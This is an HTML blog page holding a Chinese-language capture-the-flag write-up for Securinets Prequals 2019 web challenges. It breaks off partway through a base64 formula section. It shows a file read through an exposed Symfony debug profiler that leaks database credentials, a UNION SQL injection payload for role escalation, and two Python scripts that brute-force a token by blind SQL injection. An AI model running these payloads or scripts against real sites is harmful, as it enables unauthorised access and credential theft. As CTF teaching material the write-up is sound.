@@ -1,0 +1,1675 @@
+<!DOCTYPE html>
+<html>
+    <!-- title -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="damn1t">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="damn1t">
+    <meta name="keywords" content=" | damn1t">
+    <meta name="description" content="">
+    <meta name="Cache-Control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <title>Securinets Prequals CTF 2019 · Damn World</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s 1;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= /css/style.css?v=20180501 as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= /css/mobile.css?v=20180501 media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+        
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/Spson.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />    
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >damn guys</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">Securinets Prequals CTF 2019</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>damn guys</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style=
+
+
+
+
+
+
+
+
+height:50vh;
+
+>
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/page.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            Securinets Prequals CTF 2019
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <!-- 文章页标签  -->
+            
+                <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "CTF">CTF</a>
+    
+</div>
+            
+            <div class="post-intro-meta">
+                <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                <span class="post-intro-time">2019/03/30</span>
+                
+                <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                    <span class="iconfont-archer">&#xe602;</span>
+                    <span id="busuanzi_value_page_pv"></span>
+                </span>
+                
+                <span class="shareWrapper">
+                    <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                    <span class="shareText">Share</span>
+                    <ul class="shareList">
+                        <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                            <div class="share-qrcode"></div>
+                        </li>
+                        <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                        <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                        <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                        <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                    </ul>
+                </span>
+            </div>
+        
+    </div>
+</div>
+        <script>
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+  
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntroTags = document.getElementsByClassName('post-intro-tags')[0],
+        postIntroMeat = document.getElementsByClassName('post-intro-meta')[0];
+      if (postIntroTags) {
+        postIntroTags.classList.add('post-fade-in');
+      }
+      if (postIntroMeat) {
+        postIntroMeat.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="Securinets-Prequals-CTF-2019"><a href="#Securinets-Prequals-CTF-2019" class="headerlink" title="Securinets Prequals CTF 2019"></a>Securinets Prequals CTF 2019</h1><h2 id="custom-location"><a href="#custom-location" class="headerlink" title="custom location"></a>custom location</h2><p>在url后追加<code>/robots.txt</code>，报错，出现调试页面，仔细观察url，尝试读取文件</p>
+<pre><code>https://web0.ctfsecurinets.com/_profiler/open?file=public/index.php
+</code></pre><p>跟入index.php，发现一行<code>require dirname(__DIR__).&#39;/config/bootstrap.php&#39;;</code><br>于是改payload为<code>file=/config/bootstrap.php</code>，看到：</p>
+<pre><code>&lt;?php
+use Symfony\Component\Dotenv\Dotenv;
+require dirname(__DIR__).&apos;/vendor/autoload.php&apos;;
+// Load cached env vars if the .env.local.php file exists
+// Run &quot;composer dump-env prod&quot; to create it (requires symfony/flex &gt;=1.2)
+if (is_array($env = @include dirname(__DIR__).&apos;/.env.local.php&apos;)) {
+$_SERVER += $env;
+$_ENV += $env;
+} elseif (!class_exists(Dotenv::class)) {
+throw new RuntimeException(&apos;Please run &quot;composer require symfony/dotenv&quot; to load the &quot;.env&quot; files configuring the application.&apos;);
+} else {
+// load all the .env files
+(new Dotenv())-&gt;loadEnv(dirname(__DIR__).&apos;/secret_ctf_location/env&apos;);
+}
+$_SERVER[&apos;APP_ENV&apos;] = $_ENV[&apos;APP_ENV&apos;] = ($_SERVER[&apos;APP_ENV&apos;] ?? $_ENV[&apos;APP_ENV&apos;] ?? null) ?: &apos;dev&apos;;
+$_SERVER[&apos;APP_DEBUG&apos;] = $_SERVER[&apos;APP_DEBUG&apos;] ?? $_ENV[&apos;APP_DEBUG&apos;] ?? &apos;prod&apos; !== $_SERVER[&apos;APP_ENV&apos;];
+$_SERVER[&apos;APP_DEBUG&apos;] = $_ENV[&apos;APP_DEBUG&apos;] = (int) $_SERVER[&apos;APP_DEBUG&apos;] || filter_var($_SERVER[&apos;APP_DEBUG&apos;], FILTER_VALIDATE_BOOLEAN) ? &apos;1&apos; : &apos;0&apos;;
+</code></pre><p>看到了<code>/secret_ctf_location/env</code>，查看该文件，得到flag</p>
+<pre><code># In all environments, the following files are loaded if they exist,
+# the later taking precedence over the former:
+#
+#  * .envcontains default values for the environment variables needed by the app
+#  * .env.local  uncommitted file with local overrides
+#  * .env.$APP_ENV   committed environment-specific defaults
+#  * .env.$APP_ENV.local uncommitted environment-specific overrides
+#
+# Real environment variables win over .env files.
+#
+# DO NOT DEFINE PRODUCTION SECRETS IN THIS FILE NOR IN ANY OTHER COMMITTED FILES.
+#
+# Run &quot;composer dump-env prod&quot; to compile .env files for production use (requires symfony/flex &gt;=1.2).
+# https://symfony.com/doc/current/best_practices/configuration.html#infrastructure-related-configuration
+###&gt; symfony/framework-bundle ###
+APP_ENV=dev
+APP_SECRET=44705a2f4fc85d70df5403ac8c7649fd
+#TRUSTED_PROXIES=127.0.0.1,127.0.0.2
+#TRUSTED_HOSTS=&apos;^localhost|example\.com$&apos;
+###&lt; symfony/framework-bundle ###
+###&gt; doctrine/doctrine-bundle ###
+# Format described at http://docs.doctrine-project.org/projects/doctrine-dbal/en/latest/reference/configuration.html#connecting-using-a-url
+# For an SQLite database, use: &quot;sqlite:///%kernel.project_dir%/var/data.db&quot;
+# Configure your db driver and server_version in config/packages/doctrine.yaml
+DATABASE_URL=mysql://symfony_admin:Securinets{D4taB4se_P4sSw0Rd_My5qL_St0L3n}@127.0.0.1:3306/symfony_task
+###&lt; doctrine/doctrine-bundle ###
+###&gt; symfony/swiftmailer-bundle ###
+# For Gmail as a transport, use: &quot;gmail://username:password@localhost&quot;
+# For a generic SMTP server, use: &quot;smtp://localhost:25?encryption=&amp;auth_mode=&quot;
+# Delivery is disabled by default via &quot;null://localhost&quot;
+MAILER_URL=null://localhost
+###&lt; symfony/swiftmailer-bundle ###
+</code></pre><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>改url为<code>https://web0.ctfsecurinets.com/_profiler</code>，出现一个控制面板<br><img src="https://i.imgur.com/VPA7F39.png" alt="1"></p>
+<p>点击token，进入控制面板，然后查看路由，尝试_profile/phpinfo,但是没什么东西，于是返回控制面版的<code>request/response</code>，点击<code>Server Parameters</code>，在<code>DATABASE_URL</code>字段看到<code>&quot;mysql://symfony_admin:Securinets{D4taB4se_P4sSw0Rd_My5qL_St0L3n}@127.0.0.1:3306/symfony_task&quot;</code></p>
+<h2 id="sql-injected"><a href="#sql-injected" class="headerlink" title="sql injected"></a>sql injected</h2><p>题目给出了源码，查看index.php</p>
+<pre><code>if (isset($_POST[&apos;post_author&apos;])) {
+$sql = &quot;SELECT * FROM posts WHERE author = &apos;&quot;. mysqli_real_escape_string($conn, $_POST[&apos;post_author&apos;]) .&quot;&apos;&quot;;
+try {
+$posts = $conn-&gt;query($sql);
+} catch(Exception $err) {
+echo &apos;err: &apos;.$err;
+}
+} else {
+$sql = &quot;SELECT * FROM posts WHERE author = &apos;&quot;. $_SESSION[&apos;username&apos;] .&quot;&apos;&quot;;
+try {
+$posts = $conn-&gt;query($sql);
+} catch(Exception $err) {
+echo &apos;err: &apos;.$err;
+}
+}
+</code></pre><p>这是查询的方式，<code>&quot;SELECT * FROM posts WHERE author = &#39;&quot;. $_SESSION[&#39;username&#39;] .&quot;&#39;&quot;;</code>，无过滤，为漏洞点<br>又查看create_db.sql，字段如下：</p>
+<pre><code>create database webn;
+create table users (id int auto_increment primary key, login varchar(100), password varchar(100), role boolean default 0);
+create table posts (id int auto_increment primary key, title varchar(50), content text, date Date, author varchar(100));
+</code></pre><p>flag的条件为<br>flags.php:<code>$_SESSION[&#39;role&#39;] === &#39;1&#39;</code><br>在login.php中：</p>
+<pre><code>if (isset($_POST[&apos;username&apos;]) &amp;&amp; !empty($_POST[&apos;username&apos;]) &amp;&amp; isset($_POST[&apos;password&apos;]) &amp;&amp; !empty($_POST[&apos;password&apos;])) {
+$username = mysqli_real_escape_string($conn, $_POST[&apos;username&apos;]);
+$password = mysqli_real_escape_string($conn, $_POST[&apos;password&apos;]);
+$sql = &quot;SELECT * FROM users WHERE login=&apos;&quot;. $username .&quot;&apos; and password=&apos;&quot;. $password .&quot;&apos;&quot;;
+$res = $conn-&gt;query($sql);
+if($res-&gt;num_rows &gt; 0) {
+$user = $res-&gt;fetch_assoc();
+$_SESSION[&apos;username&apos;] = $user[&apos;login&apos;];
+$_SESSION[&apos;role&apos;] = $user[&apos;role&apos;];
+header(&apos;location: index.php&apos;);
+die();
+} else {
+$success = false;
+}
+}
+</code></pre><p>所以可以构造<code>&#39; UNION SELECT 1, password, login, 4, 5 where role=1 -- asdf</code>，注册，然后重新以root和得到的密码登录</p>
+<h2 id="Beginner’s-Luck"><a href="#Beginner’s-Luck" class="headerlink" title="Beginner’s Luck"></a>Beginner’s Luck</h2><p>源码分析<br><strong>index.php</strong></p>
+<pre><code>function generateRandomToken($length)
+    {
+        //generate random token
+    }
+
+if (!isset($_SESSION[&apos;count&apos;]))
+    {
+    $_SESSION[&apos;count&apos;] = 0;
+    $pass = generateRandomToken(100);
+    $ip = $_SERVER[&apos;REMOTE_ADDR&apos;];
+    $sql = &quot;INSERT INTO users (ip, token) VALUES (?,?)&quot;;
+    $stmt = $pdo-&gt;prepare($sql);
+    $stmt-&gt;execute([$ip, $pass]);
+    }
+</code></pre><p>插入ip和随机生成的token<br><strong>play.php</strong></p>
+<pre><code>&lt;?php
+$max_count = 10;
+
+if (!isset($_SESSION[&apos;count&apos;]))
+    {
+    echo &quot;&lt;h1&gt;Session Expired ! Please click &lt;a href=&apos;start.php&apos;&gt;&lt;/h1&gt; here&lt;/a&gt; &quot;;
+    die();
+    }
+
+require_once (&quot;task_bd.php&quot;);
+
+$currentValue = &apos;&apos;;
+
+if (isset($_POST[&quot;val&quot;]))
+    {
+    if ($_SESSION[&apos;count&apos;] &gt;= $max_count)
+        {
+        header(&quot;Location:reset.php&quot;);
+        die();
+        }
+
+    $_SESSION[&apos;count&apos;]++;
+    try
+        {
+        $sql = &quot;SELECT * FROM users WHERE ip=&apos;&quot; . $_SERVER[&apos;REMOTE_ADDR&apos;] . &quot;&apos; AND token=&apos;&quot; . $_POST[&apos;val&apos;] . &quot;&apos;&quot;;
+        $result = $conn-&gt;query($sql);
+        if ($result)
+            {
+            $row = $result-&gt;fetch_assoc();
+            }
+          else
+            {
+            $row = false;
+            }
+        }
+
+    catch(PDOException $e)
+        {
+
+        // echo $e;
+
+        }
+
+    if ($row)
+        {
+        echo &quot;&lt;h1&gt;True&lt;/h1&gt;&quot;;
+        echo &quot;&lt;div&gt;&lt;h4&gt;Click &lt;a href=&apos;flag.php&apos;&gt;here&lt;/a&gt; and use the token to get your flag&lt;/h4&gt;&lt;/div&gt;&quot;;
+        }
+      else
+        {
+        echo &quot;&lt;h4&gt;Better luck next time !&lt;/h4&gt;&quot;;
+        }
+
+    $currentValue = $_POST[&apos;val&apos;];
+    }
+
+echo &quot;&lt;h3&gt;Attempt: &quot; . ($_SESSION[&apos;count&apos;]) . &quot; / &quot; . $max_count . &quot;&lt;/h2&gt;&lt;br /&gt;&quot;;
+?&gt;
+</code></pre><p>查询对应的token和ip，可知，那就要写script爆破了<br>脚本1：</p>
+<pre><code>import requests
+
+url = &quot;https://web4.ctfsecurinets.com/play.php&quot;
+
+injection = &quot;&apos; OR (ip=&apos;teammate IP&apos; AND substring(token,%s,1)=&apos;%s&apos;) AND &apos;1&apos;=&apos;1&quot;
+token = &apos;&apos;
+
+for i in range(1, 101):
+  for b in &apos;abcdefghijklmnopqrstuvwxyz0123456789&apos;:
+# Resetting the session and requesting a new one, just in case.
+# The exploit would have been faster by removing this.
+requests.get(url.replace(&apos;play&apos;, &apos;reset&apos;))
+s = requests.session()
+s.get(url.replace(&apos;play&apos;, &apos;index&apos;))
+c = s.post(url, data={&apos;val&apos;: injection % (i, b)}).content
+if b&apos;&gt;True&lt;&apos; in c:
+  token += b
+  print(i, token)
+  break
+</code></pre><p>脚本2：</p>
+<pre><code>import time
+import random
+import os
+import string
+import requests
+
+token = &quot;&quot;
+found = len(token)
+letters = list(string.ascii_lowercase + string.ascii_uppercase + string.digits)
+letter_candidate = 0
+payload = &quot;val=&apos; OR (ip=&apos;x.x.x.x&apos; AND token LIKE &apos;{}%&apos;) #&quot;
+headers = {
+   &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US);&quot;, 
+   &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;
+}
+url_main = &quot;https://web4.ctfsecurinets.com/&quot;
+url_index = url_main + &quot;index.php&quot;
+url_play = url_main + &quot;play.php&quot;
+url_reset = url_main + &quot;reset.php&quot;
+url_start = url_main + &quot;start.php&quot;
+
+global_debug = False
+def debug(page, local_debug):
+   if global_debug and local_debug:
+  print page.status_code
+  print page.headers
+  print page.text
+
+try:
+
+   print &quot;[*] Contacting &apos;{}&apos;.&quot;.format(url_reset)
+   page = requests.get(url_reset, headers=headers)
+   cookies = {&quot;PHPSESSID&quot;: page.cookies[&quot;PHPSESSID&quot;]}
+   debug(page, False)
+
+
+   while found &lt; 100:
+
+  print &quot;[*] Contacting &apos;{}&apos;.&quot;.format(url_index)
+  page = requests.get(url_index, headers=headers, cookies=cookies)
+  debug(page, False)
+
+  if &quot;Session Expired&quot; in page.text:
+ print &quot;[*] Session expired, contacting &apos;{}&apos;.&quot;.format(url_index)
+ page = requests.get(url_index, headers=headers, cookies=cookies)
+ debug(page, False)
+  elif &quot;Attempt&quot; in page.text:
+ letter = letters[letter_candidate]
+ attempt = token + letter
+ print &quot;[*] Attempt &apos;{}&apos;.&quot;.format(attempt)
+ data = payload.format(attempt)
+ print &quot;[*] Payload: {}.&quot;.format(data)
+ page = requests.post(url_play, data=data, headers=headers, cookies=cookies)
+ debug(page, False)
+
+ if &quot;True&quot; in page.text:
+token += letter
+found += 1
+letter_candidate = 0
+print &quot;[*] Correct letter, new token &apos;{}&apos;.&quot;.format(token)
+ elif &quot;Better luck next time&quot; in page.text:
+letter_candidate = letter_candidate + 1
+print &quot;[*] Wrong letter.&quot; 
+ elif &quot;Max Attempts Reahed&quot; in page.text:
+print &quot;[*] Max attempts reached, contacting &apos;{}&apos;.&quot;.format(url_index)
+page = requests.get(url_index, headers=headers, cookies=cookies)
+debug(page, False)
+ else:
+print &quot;[!] Something not working.&quot;
+break
+
+  # Go to sleep.
+  sleep_interval = 0
+  print &quot;[*] Sleeping {} secs.&quot;.format(sleep_interval)
+  time.sleep(sleep_interval)
+
+except KeyboardInterrupt:
+   print &quot;[-] Interrupted!&quot;    
+</code></pre><h2 id="Trading-values"><a href="#Trading-values" class="headerlink" title="Trading values"></a>Trading values</h2><p>查看网页源码：</p>
+<pre><code>&lt;script&gt;
+
+Highcharts.chart(&apos;container&apos;, {
+chart: {
+type: &apos;spline&apos;,
+animation: Highcharts.svg, // don&apos;t animate in old IE
+marginRight: 10,
+events: {
+load: function () {
+
+// set up the updating of the chart each second
+var series = this.series[0];
+var formula=&quot;KHYxLm1wayt2MS5kcmYqKHYxLm1way8wLjUpLXYxLmRyZikvKHYxLmF2ZyowLjEpKyh2Mi5hdmcqKHYyLm1kcyt2Mi5kbXEpKS0odjMucGRpK3YzLnBkaSszLzIqKHYzLnJhciktdjMuZ2RwKSswLjI1Kih2NC5tdW0qdjQuZGFkKSp2NC5hdmc=&quot;;
+setInterval(function () {
+  $.get( &quot;/default&quot;, { &quot;formula&quot;: formula, &quot;values&quot;:{&quot;v1&quot;: &quot;STC&quot;,&quot;v2&quot;:&quot;PLA&quot;,&quot;v3&quot;:&quot;SDF&quot;,&quot;v4&quot;:&quot;OCK&quot;} }   )
+  .done(function( data ) {
+var x = (new Date()).getTime(), // current time
+y = parseInt(data);
+if(y&lt;1000)formula=&quot;KHYxLm1wayt2MS5kcmYqKHYxLm1way8wLjUpLXYxLmRyZikvKHYxLmF2ZyowLjEpKyh2Mi5hdmcqKHYyLm1kcyt2Mi5kbXEpKS0odjMucGRpK3YzLnBkaSszLzIqKHYzLnJhciktdjMuZ2RwKSswLjI1Kih2NC5tdW0qdjQuZGFkKSp2NC5hdmc=&quot;;
+else if(y&gt;1000 &amp;&amp; y&lt;10000)formula=&quot;KHYxLm1way12MS5kcmYqKHYxLm1way8xMDApLXYxLmRyZikvKHYxLmF2ZyowLjMpLSh2Mi5hdmcvKCg0LzMpKnYyLm1kcyt2Mi5kbXEqMTAwKSkrKHYzLnBkaSt2My5wZGkrMy8yKig1KnYzLnJhciktNjkqdjMuZ2RwKSsxLjcqKHY0Lm11bSp2NC5kYWQpKjE2LjUqdjQuYXZn&quot;;
+else if(y&gt;10000 &amp;&amp; y&lt;100000)formula=&quot;KHYxLm1way12MS5kcmYqKHYxLm1way8wLjEpLXYxLmRyZikvKHYxLmF2ZyowLjgpLSh2Mi5hdmcvKCgxLzIpKnYyLm1kcy0yNC92Mi5kbXEqMTApKSsodjMucGRpLXYzLnBkaSszLzIqKDIvNSp2My5yYXIpLTY2KnYzLmdkcCkqNy41Lyh2NC5tdW0vdjQuZGFkKSo2LjUvdjQuYXZn&quot;;
+else formula=&quot;KHYxLm1way12MS5kcmYqKHYxLm1way8wLjA2KS12MS5kcmYpLyh2MS5hdmcqMC4yNSkrKHYyLmF2Zy8oKDMvMikvdjIubWRzLTg0L3YyLmRtcSoxOSkpLSh2My5wZGktdjMucGRpKzkvMiooMTIvNyp2My5yYXIpLTY2KnYzLmdkcCkqMC41Lyh2NC5tdW0qKnY0LmRhZCkqMC4zOS92NC5hdmcqKjI=&quot;;
+series.addPoint([x, y], true, true);
+  });
+}, 1000);
+}
+}
+},
+
+time: {
+useUTC: false
+},
+
+title: {
+text: &apos;Live Securinets Trading values&apos;
+},
+xAxis: {
+type: &apos;datetime&apos;,
+tickPixelInterval: 300
+},
+yAxis: {
+title: {
+text: &apos;Value&apos;
+},
+plotLines: [{
+value: 0,
+width: 1,
+color: &apos;#808080&apos;
+}]
+},
+tooltip: {
+headerFormat: &apos;&lt;b&gt;{series.name}&lt;/b&gt;&lt;br/&gt;&apos;,
+pointFormat: &apos;{point.x:%Y-%m-%d %H:%M:%S}&lt;br/&gt;{point.y:.2f}&apos;
+},
+legend: {
+enabled: false
+},
+exporting: {
+enabled: false
+},
+series: [{
+name: &apos;Random data&apos;,
+data: (function () {
+// generate an array of random data
+var data = [],
+time = (new Date()).getTime(),
+i;
+
+for (i = -19; i &lt;= 0; i += 1) {
+data.push({
+x: time + i * 1000,
+y: Math.random()
+});
+}
+return data;
+}())
+}]
+});
+&lt;/script&gt;
+</code></pre><p>注意到有三个base64编码：</p>
+<ul>
+<li><p><code>KHYxLm1wayt2MS5kcmYqKHYxLm1way8wLjUpLXYxLmRyZikvKHYxLmF2ZyowLjEpKyh2Mi5hdmcqKHYyLm1kcyt2Mi5kbXEpKS0odjMucGRpK3YzLnBkaSszLzIqKHYzLnJhciktdjMuZ2RwKSswLjI1Kih2NC5tdW0qdjQuZGFkKSp2NC5hdmc=</code></p>
+</li>
+<li><p><code>KHYxLm1way12MS5kcmYqKHYxLm1way8xMDApLXYxLmRyZikvKHYxLmF2ZyowLjMpLSh2Mi5hdmcvKCg0LzMpKnYyLm1kcyt2Mi5kbXEqMTAwKSkrKHYzLnBkaSt2My5wZGkrMy8yKig1KnYzLnJhciktNjkqdjMuZ2RwKSsxLjcqKHY0Lm11bSp2NC5kYWQpKjE2LjUqdjQuYXZn</code></p>
+</li>
+<li><p><code>KHYxLm1way12MS5kcmYqKHYxLm1way8wLjA2KS12MS5kcmYpLyh2MS5hdmcqMC4yNSkrKHYyLmF2Zy8oKDMvMikvdjIubWRzLTg0L3YyLmRtcSoxOSkpLSh2My5wZGktdjMucGRpKzkvMiooMTIvNyp2My5yYXIpLTY2KnYzLmdkcCkqMC41Lyh2NC5tdW0qKnY0LmRhZCkqMC4zOS92NC5hdmcqKjI=</code></p>
+</li>
+</ul>
+<p>解码分别为：</p>
+<ul>
+<li><p><code>(v1.mpk+v1.drf*(v1.mpk/0.5)-v1.drf)/(v1.avg*0.1)+(v2.avg*(v2.mds+v2.dmq))-(v3.pdi+v3.pdi+3/2*(v3.rar)-v3.gdp)+0.25*(v4.mum*v4.dad)*v4.avg</code></p>
+</li>
+<li><p><code>(v1.mpk-v1.drf*(v1.mpk/100)-v1.drf)/(v1.avg*0.3)-(v2.avg/((4/3)*v2.mds+v2.dmq*100))+(v3.pdi+v3.pdi+3/2*(5*v3.rar)-69*v3.gdp)+1.7*(v4.mum*v4.dad)*16.5*v4.avg</code></p>
+</li>
+<li><p><code>(v1.mpk-v1.drf*(v1.mpk/0.06)-v1.drf)/(v1.avg*0.25)+(v2.avg/((3/2)/v2.mds-84/v2.dmq*19))-(v3.pdi-v3.pdi+9/2*(12/7*v3.rar)-66*v3.gdp)*0.5/(v4.mum**v4.dad)*0.39/v4.avg**2</code></p>
